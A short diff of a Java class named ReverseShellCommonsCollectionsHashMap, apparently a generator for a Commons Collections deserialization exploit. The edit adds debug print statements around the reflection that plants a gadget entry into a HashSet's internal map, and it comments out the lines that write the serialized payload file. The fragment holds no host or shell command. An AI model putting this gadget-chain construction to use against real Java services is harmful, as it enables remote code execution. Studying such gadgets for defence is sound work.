@@ -95,6 +95,9 @@ public class ReverseShellCommonsCollectionsHashMap {
 
         HashSet map = new HashSet(1);
         map.add("foo");
+        
+        System.out.println(map);
+        System.out.println(entry);
         Field f = null;
         try {
             f = HashSet.class.getDeclaredField("map");
@@ -104,7 +107,8 @@ public class ReverseShellCommonsCollectionsHashMap {
 
         f.setAccessible(true);
         HashMap innimpl = (HashMap) f.get(map);
-
+        System.out.println(f);
+        System.out.println(map);
         Field f2 = null;
         try {
             f2 = HashMap.class.getDeclaredField("table");
@@ -129,14 +133,12 @@ public class ReverseShellCommonsCollectionsHashMap {
 
         keyField.setAccessible(true);
         keyField.set(node, entry);
-
         // Serializa o objeto
-        System.out.println("Saving serialized object in ReverseShellCommonsCollectionsHashMap.ser");
-        FileOutputStream fos = new FileOutputStream("ReverseShellCommonsCollectionsHashMap.ser");
-        ObjectOutputStream oos = new ObjectOutputStream(fos);
-        oos.writeObject(map);
-        oos.flush();
-
+        // System.out.println("Saving serialized object in ReverseShellCommonsCollectionsHashMap.ser");
+        // FileOutputStream fos = new FileOutputStream("ReverseShellCommonsCollectionsHashMap.ser");
+        // ObjectOutputStream oos = new ObjectOutputStream(fos);
+        // oos.writeObject(map);
+        // oos.flush();
 
     }
 
